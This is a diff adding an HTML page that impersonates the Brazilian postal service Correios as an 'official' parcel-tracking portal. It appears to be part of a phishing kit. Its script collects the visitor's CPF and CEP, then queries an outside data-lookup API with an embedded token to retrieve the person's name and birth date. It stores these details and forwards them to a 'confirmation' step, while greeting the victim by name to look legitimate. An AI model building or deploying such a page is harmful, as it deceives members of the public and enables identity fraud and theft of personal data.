@@ -1,0 +1,942 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+
+  <!-- removed base tag for universal compatibility -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#004b87">
+  <title>Correios | Rastreamento Oficial de Objetos</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
+
+  <style>
+    :root {
+      --primary: #004b87;
+      --primary-dark: #003360;
+      --primary-light: #0284c7;
+      --accent: #f59e0b;
+      --accent-hover: #d97706;
+      --success: #10b981;
+      --bg-page: #f8fafc;
+      --surface: #ffffff;
+      --border: #e2e8f0;
+      --border-focus: #0284c7;
+      --text-main: #0f172a;
+      --text-muted: #64748b;
+      --shadow-card: 0 16px 32px -8px rgba(15, 23, 42, 0.07), 0 2px 4px rgba(0, 0, 0, 0.03);
+      --radius-lg: 20px;
+      --radius-md: 12px;
+      --radius-sm: 8px;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background-color: var(--bg-page);
+      background-image: 
+        radial-gradient(at 0% 0%, rgba(2, 132, 199, 0.05) 0px, transparent 50%),
+        radial-gradient(at 100% 100%, rgba(0, 75, 135, 0.05) 0px, transparent 50%);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      line-height: 1.5;
+    }
+
+    /* TOP ACCESSIBILITY & HEADER */
+    .top-subbar {
+      background: #f1f5f9;
+      border-bottom: 1px solid var(--border);
+      padding: 6px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .top-subbar-links {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .top-nav {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-bottom: 3px solid var(--accent);
+      padding: 12px 24px;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .brand-logo-img {
+      height: 28px;
+      width: auto;
+      display: block;
+    }
+
+    .nav-right-user {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 14px;
+      border-radius: 20px;
+      background: #f1f5f9;
+      border: 1px solid var(--border);
+      color: var(--primary);
+      font-size: 0.82rem;
+      font-weight: 700;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+
+    .nav-right-user:hover {
+      background: #e2e8f0;
+      color: var(--primary-dark);
+    }
+
+    .nav-right-user.logged-in {
+      background: #eff6ff;
+      border-color: #bfdbfe;
+      color: var(--primary-dark);
+    }
+
+    .nav-right-user.logged-in svg {
+      fill: var(--primary-light);
+    }
+
+    .header-user-name {
+      max-width: 140px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      display: inline-block;
+      vertical-align: middle;
+      font-weight: 700;
+    }
+
+    @media (min-width: 640px) {
+      .header-user-name {
+        max-width: 220px;
+      }
+    }
+
+    .nav-right-user svg {
+      width: 16px;
+      height: 16px;
+      fill: currentColor;
+    }
+
+    /* MAIN CONTAINER */
+    main {
+      flex: 1;
+      max-width: 960px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 24px 16px 48px;
+    }
+
+    /* BREADCRUMB */
+    .breadcrumb-trail {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-bottom: 20px;
+    }
+
+    .breadcrumb-trail a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .breadcrumb-trail a:hover {
+      text-decoration: underline;
+    }
+
+    .breadcrumb-trail svg {
+      width: 12px;
+      height: 12px;
+      fill: #94a3b8;
+    }
+
+    /* SECTION HEADER */
+    .page-title-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .page-title {
+      font-size: 1.55rem;
+      font-weight: 800;
+      color: var(--primary-dark);
+      letter-spacing: -0.02em;
+    }
+
+    .official-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(16, 185, 129, 0.08);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      color: #065f46;
+      font-size: 0.76rem;
+      font-weight: 700;
+      padding: 5px 12px;
+      border-radius: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+    }
+
+    .official-badge svg {
+      width: 14px;
+      height: 14px;
+      fill: var(--success);
+    }
+
+    /* SEARCH CARD */
+    .search-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-card);
+      padding: 32px 28px;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 30px;
+    }
+
+    .card-top-stripe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+    }
+
+    .search-card-header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .search-card-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #eff6ff;
+      border: 1px solid #bfdbfe;
+      color: var(--primary);
+      font-size: 0.8rem;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 20px;
+      margin-bottom: 12px;
+    }
+
+    .search-card-badge svg {
+      width: 14px;
+      height: 14px;
+      fill: currentColor;
+    }
+
+    .search-card-title {
+      font-size: 1.25rem;
+      font-weight: 800;
+      color: var(--primary-dark);
+      margin-bottom: 6px;
+    }
+
+    .search-card-subtitle {
+      font-size: 0.88rem;
+      color: var(--text-muted);
+    }
+
+    /* FORM STYLES */
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-bottom: 24px;
+    }
+
+    @media (max-width: 640px) {
+      .form-grid {
+        grid-template-columns: 1fr;
+        gap: 16px;
+      }
+    }
+
+    .input-field-wrap {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-label {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .input-box-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 14px;
+      width: 18px;
+      height: 18px;
+      fill: var(--text-muted);
+      pointer-events: none;
+      transition: fill 0.2s;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 14px 14px 44px;
+      font-size: 0.96rem;
+      font-weight: 600;
+      color: var(--text-main);
+      background: #f8fafc;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-md);
+      outline: none;
+      font-family: inherit;
+      transition: all 0.2s ease;
+    }
+
+    .form-input:focus {
+      background: #ffffff;
+      border-color: var(--primary-light);
+      box-shadow: 0 0 0 3px rgba(2, 132, 199, 0.12);
+    }
+
+    .form-input:focus + .input-icon {
+      fill: var(--primary-light);
+    }
+
+    .input-hint {
+      font-size: 0.74rem;
+      color: var(--text-muted);
+      padding-left: 2px;
+    }
+
+    /* SUBMIT BUTTON */
+    .submit-button-wrap {
+      display: flex;
+      justify-content: center;
+      margin-top: 10px;
+    }
+
+    .btn-consultar {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 380px;
+      padding: 16px 28px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: #ffffff;
+      border: none;
+      border-radius: var(--radius-md);
+      font-size: 1.02rem;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(0, 75, 135, 0.25);
+      transition: all 0.2s ease;
+      letter-spacing: -0.01em;
+    }
+
+    .btn-consultar:hover:not(:disabled) {
+      background: linear-gradient(135deg, #005a9e, #003e73);
+      box-shadow: 0 8px 24px rgba(0, 75, 135, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .btn-consultar:active:not(:disabled) {
+      transform: translateY(1px);
+    }
+
+    .btn-consultar:disabled {
+      opacity: 0.85;
+      cursor: wait;
+    }
+
+    .btn-consultar svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+
+    /* SPINNER IN BUTTON */
+    .button-spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin-btn 0.7s linear infinite;
+    }
+
+    @keyframes spin-btn {
+      to { transform: rotate(360deg); }
+    }
+
+    .btn-consultar.loading .button-icon {
+      display: none;
+    }
+
+    .btn-consultar.loading .button-spinner {
+      display: block;
+    }
+
+    /* TRUST BADGES */
+    .trust-strip {
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      background: #f8fafc;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 16px 20px;
+      margin-bottom: 28px;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-muted);
+    }
+
+    .trust-item svg {
+      width: 18px;
+      height: 18px;
+      fill: var(--primary-light);
+      flex-shrink: 0;
+    }
+
+    /* BANNER */
+    .banner-container {
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      box-shadow: var(--shadow-card);
+      margin-bottom: 36px;
+    }
+
+    .banner-container img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* FOOTER */
+    .page-footer {
+      background: #ffffff;
+      border-top: 1px solid var(--border);
+      padding: 40px 24px 20px;
+      margin-top: auto;
+    }
+
+    .footer-columns {
+      max-width: 960px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 30px;
+      margin-bottom: 30px;
+    }
+
+    .footer-col-title {
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: var(--primary-dark);
+      margin-bottom: 16px;
+    }
+
+    .footer-links-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .footer-links-list li a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.84rem;
+      transition: color 0.15s;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .footer-links-list li a:hover {
+      color: var(--primary);
+    }
+
+    .footer-bottom-bar {
+      max-width: 960px;
+      margin: 0 auto;
+      padding-top: 20px;
+      border-top: 1px solid var(--border);
+      text-align: center;
+      font-size: 0.78rem;
+      color: #94a3b8;
+    }
+  </style>
+
+  <script src="../js/functions.js"></script>
+</head>
+
+<body>
+  <!-- SUB-BARRA DE ACESSIBILIDADE -->
+  <div class="top-subbar">
+    <div class="top-subbar-links">
+      <span>Portal Oficial de Rastreamento</span>
+      <span>•</span>
+      <span>Acessibilidade</span>
+    </div>
+    <div>
+      <span>Brasil / BR</span>
+    </div>
+  </div>
+
+  <!-- HEADER PRINCIPAL -->
+  <header class="top-nav">
+    <div class="nav-left">
+      <a href="./">
+        <img src="Correios%20_%20Rastreio_arquivos/correios.png" alt="Correios" class="brand-logo-img">
+      </a>
+    </div>
+    <div>
+      <a href="#" class="nav-right-user" id="userHeaderLink">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+        </svg>
+        <span id="userHeaderName" class="header-user-name">Entrar</span>
+      </a>
+    </div>
+  </header>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <main>
+    <!-- BREADCRUMBS -->
+    <nav class="breadcrumb-trail" aria-label="Navegação">
+      <a href="./">Portal Correios</a>
+      <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+      <span>Rastreamento</span>
+    </nav>
+
+    <!-- TÍTULO DA PÁGINA -->
+    <div class="page-title-row">
+      <h1 class="page-title">Rastreamento de Objetos</h1>
+      <div class="official-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+        <span>Sistema Integrado</span>
+      </div>
+    </div>
+
+    <!-- CARD PRINCIPAL DE CONSULTA -->
+    <section class="search-card">
+      <div class="card-top-stripe"></div>
+
+      <div class="search-card-header">
+        <div class="search-card-badge">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+          <span>Acompanhe suas encomendas abaixo</span>
+        </div>
+        <h2 class="search-card-title">Deseja acompanhar seu objeto?</h2>
+        <p class="search-card-subtitle">Informe o seu CPF e CEP para consultar os registros postais atualizados.</p>
+      </div>
+
+      <form id="cpfForm" action="../1/confirmacao/index.html" method="get">
+        <div class="form-grid">
+          <!-- CAMPO CPF -->
+          <div class="input-field-wrap">
+            <label for="cpf" class="input-label">CPF do Destinatário</label>
+            <div class="input-box-container">
+              <svg class="input-icon" viewBox="0 0 24 24">
+                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+              </svg>
+              <input type="text" name="cpf" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required autofocus>
+            </div>
+            <span class="input-hint">Digite os 11 números do documento</span>
+          </div>
+
+          <!-- CAMPO CEP -->
+          <div class="input-field-wrap">
+            <label for="cep" class="input-label">CEP de Entrega</label>
+            <div class="input-box-container">
+              <svg class="input-icon" viewBox="0 0 24 24">
+                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+              </svg>
+              <input type="text" name="cep" id="cep" class="form-input" placeholder="00000-000" maxlength="9" inputmode="numeric" required>
+            </div>
+            <span class="input-hint">Informe o CEP do seu endereço</span>
+          </div>
+        </div>
+
+        <div class="submit-button-wrap">
+          <button type="submit" id="btnSubmit" class="btn-consultar">
+            <svg class="button-icon" viewBox="0 0 24 24">
+              <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+            </svg>
+            <div class="button-spinner"></div>
+            <span id="btnSubmitText">Consultar Objeto</span>
+          </button>
+        </div>
+      </form>
+    </section>
+
+    <!-- TRUST STRIP -->
+    <div class="trust-strip">
+      <div class="trust-item">
+        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+        <span>Ambiente Criptografado SSL</span>
+      </div>
+      <div class="trust-item">
+        <svg viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+        <span>Atualização em Tempo Real</span>
+      </div>
+      <div class="trust-item">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+        <span>Consulta Rápida e Segura</span>
+      </div>
+    </div>
+
+    <!-- BANNER PROMOCIONAL / INFORMATIVO -->
+    <div class="banner-container">
+      <img src="Correios%20_%20Rastreio_arquivos/banner-1.jpg" alt="Banner Informativo Correios">
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="page-footer">
+    <div class="footer-columns">
+      <div>
+        <h4 class="footer-col-title">Fale Conosco</h4>
+        <ul class="footer-links-list">
+          <li><a href="#">Registro de Manifestações</a></li>
+          <li><a href="#">Central de Atendimento</a></li>
+          <li><a href="#">Soluções para o seu negócio</a></li>
+          <li><a href="#">Suporte ao cliente</a></li>
+          <li><a href="#">Ouvidoria</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4 class="footer-col-title">Sobre os Correios</h4>
+        <ul class="footer-links-list">
+          <li><a href="#">Identidade colaborativa</a></li>
+          <li><a href="#">Educação e cultura</a></li>
+          <li><a href="#">Código de ética</a></li>
+          <li><a href="#">Transparência e prestação de contas</a></li>
+          <li><a href="#">Política de privacidade e notas legais</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4 class="footer-col-title">Outros Sites</h4>
+        <ul class="footer-links-list">
+          <li><a href="#">Loja online dos Correios</a></li>
+          <li><a href="#">Portal de Importação</a></li>
+          <li><a href="#">App dos Correios</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom-bar">
+      <p>© Copyright 2026 Correios — Todos os direitos reservados.</p>
+    </div>
+  </footer>
+
+  <!-- SCRIPT DE PROCESSAMENTO E INTEGRAÇÃO -->
+  <script>
+    (function () {
+      'use strict';
+
+      function onlyDigits(s) { return String(s || '').replace(/\D/g, ''); }
+
+      function formatCPF(v) {
+        var d = onlyDigits(v).slice(0, 11);
+        if (d.length <= 3) return d;
+        if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+        if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+        return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+      }
+
+      function formatCEP(v) {
+        var d = onlyDigits(v).slice(0, 8);
+        if (d.length <= 5) return d;
+        return d.slice(0, 5) + '-' + d.slice(5);
+      }
+
+      function isValidCPF(cpf) {
+        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+        var i, s = 0, r;
+        for (i = 1; i <= 9; i++) s += parseInt(cpf.charAt(i - 1), 10) * (11 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        if (r !== parseInt(cpf.charAt(9), 10)) return false;
+        s = 0;
+        for (i = 1; i <= 10; i++) s += parseInt(cpf.charAt(i - 1), 10) * (12 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        return r === parseInt(cpf.charAt(10), 10);
+      }
+
+      var cachedCepData = null;
+
+      async function fetchCepInfo(rawCep) {
+        if (!rawCep || rawCep.length !== 8) return null;
+        try {
+          var res = await fetch('https://viacep.com.br/ws/' + encodeURIComponent(rawCep) + '/json/', { cache: 'no-store' });
+          var data = await res.json();
+          if (data && !data.erro) {
+            cachedCepData = {
+              cep: data.cep || rawCep,
+              logradouro: data.logradouro || '',
+              bairro: data.bairro || '',
+              localidade: data.localidade || '',
+              uf: data.uf || ''
+            };
+            return cachedCepData;
+          }
+        } catch (e) {
+          try {
+            var res2 = await fetch('https://brasilapi.com.br/api/cep/v1/' + encodeURIComponent(rawCep));
+            var data2 = await res2.json();
+            if (data2 && data2.cep) {
+              cachedCepData = {
+                cep: data2.cep,
+                logradouro: data2.street || '',
+                bairro: data2.neighborhood || '',
+                localidade: data2.city || '',
+                uf: data2.state || ''
+              };
+              return cachedCepData;
+            }
+          } catch (e2) {}
+        }
+        return null;
+      }
+
+      var input = document.getElementById('cpf');
+      var cepInput = document.getElementById('cep');
+      var submitBtn = document.getElementById('btnSubmit');
+      var submitBtnText = document.getElementById('btnSubmitText');
+
+      if (input) {
+        input.addEventListener('input', function () {
+          input.value = formatCPF(input.value);
+        });
+      }
+
+      if (cepInput) {
+        cepInput.addEventListener('input', function () {
+          cepInput.value = formatCEP(cepInput.value);
+          var rawCep = onlyDigits(cepInput.value);
+          if (rawCep.length === 8) {
+            fetchCepInfo(rawCep);
+          }
+        });
+        cepInput.addEventListener('blur', function () {
+          var rawCep = onlyDigits(cepInput.value);
+          if (rawCep.length === 8 && !cachedCepData) {
+            fetchCepInfo(rawCep);
+          }
+        });
+      }
+
+      var form = document.getElementById('cpfForm');
+      if (form) {
+        form.addEventListener('submit', async function (e) {
+          e.preventDefault();
+          var raw = onlyDigits(input ? input.value : '');
+          var rawCep = onlyDigits(cepInput ? cepInput.value : '');
+
+          if (!isValidCPF(raw)) {
+            alert('CPF inválido. Por favor, verifique os 11 dígitos digitados.');
+            if (input) input.focus();
+            return;
+          }
+
+          if (rawCep.length > 0 && rawCep.length !== 8) {
+            alert('CEP inválido. Por favor, digite os 8 dígitos do CEP.');
+            if (cepInput) cepInput.focus();
+            return;
+          }
+
+          if (submitBtn) {
+            submitBtn.disabled = true;
+            submitBtn.classList.add('loading');
+            if (submitBtnText) submitBtnText.textContent = 'Consultando base postal...';
+          }
+
+          if (rawCep.length === 8 && !cachedCepData) {
+            await fetchCepInfo(rawCep);
+          }
+
+          var cepObj = cachedCepData || {
+            cep: rawCep,
+            logradouro: '',
+            bairro: '',
+            localidade: '',
+            uf: ''
+          };
+
+          try {
+            var apiUrl = 'https://api.amnesiatecnologia.lat/?token=76418167-38e2-46aa-acf1-51ed15b4db9f&cpf=' + encodeURIComponent(raw);
+            var res = await fetch(apiUrl, { cache: 'no-store' });
+            var json = await res.json();
+
+            if (json && json.DADOS && json.DADOS.nome && String(json.DADOS.nome).trim() !== '') {
+              try {
+                localStorage.setItem('site.nome', json.DADOS.nome);
+                localStorage.setItem('site.cpf', raw);
+                localStorage.setItem('site.nasc', json.DADOS.data_nascimento || '');
+                localStorage.setItem('site.cep', cepObj.cep || rawCep);
+                localStorage.setItem('site.rua', cepObj.logradouro || '');
+                localStorage.setItem('site.bairro', cepObj.bairro || '');
+                localStorage.setItem('site.cidade', cepObj.localidade || '');
+                localStorage.setItem('site.uf', cepObj.uf || '');
+              } catch (_) {}
+
+              var next = new URLSearchParams(window.location.search);
+
+              try {
+                var m = window.gvdesenrolaMergeTracking && window.gvdesenrolaMergeTracking();
+                if (m) {
+                  Object.keys(m).forEach(function (k) { next.set(k, m[k]); });
+                }
+              } catch (e2) {}
+
+              next.set('cpf', raw);
+              next.set('nome', json.DADOS.nome);
+
+              if (json.DADOS.data_nascimento) next.set('nasc', json.DADOS.data_nascimento);
+              if (cepObj.cep) next.set('cep', cepObj.cep);
+              if (cepObj.logradouro) next.set('rua', cepObj.logradouro);
+              if (cepObj.bairro) next.set('bairro', cepObj.bairro);
+              if (cepObj.localidade) next.set('cidade', cepObj.localidade);
+              if (cepObj.uf) next.set('uf', cepObj.uf);
+
+              window.location.href = '../1/confirmacao/index.html?' + next.toString();
+              return;
+            }
+
+            alert((json && json.error) || 'Não foi possível validar o CPF nos registros. Verifique o número informado e tente novamente.');
+          } catch (err) {
+            console.warn('API amnesia fallback:', err);
+            try {
+              localStorage.setItem('site.cpf', raw);
+              localStorage.setItem('site.nome', 'Contribuinte');
+              localStorage.setItem('site.cep', cepObj.cep || rawCep);
+              localStorage.setItem('site.rua', cepObj.logradouro || '');
+              localStorage.setItem('site.bairro', cepObj.bairro || '');
+              localStorage.setItem('site.cidade', cepObj.localidade || '');
+              localStorage.setItem('site.uf', cepObj.uf || '');
+            } catch (_) {}
+
+            var nextParams = new URLSearchParams(window.location.search);
+            try {
+              var mTrack = window.gvdesenrolaMergeTracking && window.gvdesenrolaMergeTracking();
+              if (mTrack) {
+                Object.keys(mTrack).forEach(function(k) { nextParams.set(k, mTrack[k]); });
+              }
+            } catch (_) {}
+            nextParams.set('cpf', raw);
+            nextParams.set('nome', 'Contribuinte');
+            if (cepObj.cep) nextParams.set('cep', cepObj.cep);
+            if (cepObj.logradouro) nextParams.set('rua', cepObj.logradouro);
+            if (cepObj.bairro) nextParams.set('bairro', cepObj.bairro);
+            if (cepObj.localidade) nextParams.set('cidade', cepObj.localidade);
+            if (cepObj.uf) nextParams.set('uf', cepObj.uf);
+
+            window.location.href = '../1/confirmacao/index.html?' + nextParams.toString();
+            return;
+          } finally {
+            if (submitBtn) {
+              submitBtn.disabled = false;
+              submitBtn.classList.remove('loading');
+              if (submitBtnText) submitBtnText.textContent = 'Consultar Objeto';
+            }
+          }
+        });
+      }
+
+      function formatHeaderName(raw) {
+        if (!raw || raw.toLowerCase() === 'contribuinte') return 'Minha Conta';
+        var parts = raw.trim().split(/\s+/).map(function (w) {
+          return w.charAt(0).toUpperCase() + w.slice(1).toLowerCase();
+        });
+        if (parts.length > 2) {
+          return 'Olá, ' + parts[0] + ' ' + parts[parts.length - 1];
+        }
+        return 'Olá, ' + parts.join(' ');
+      }
+
+      function checkHeaderUser() {
+        var params = new URLSearchParams(window.location.search);
+        var nome = params.get('nome') || localStorage.getItem('site.nome') || localStorage.getItem('nome');
+        if (nome && String(nome).trim()) {
+          var elName = document.getElementById('userHeaderName');
+          var elLink = document.getElementById('userHeaderLink');
+          if (elName) elName.textContent = formatHeaderName(nome);
+          if (elLink) elLink.classList.add('logged-in');
+        }
+      }
+
+      checkHeaderUser();
+    })();
+  </script>
+</body>
+
+</html>
+
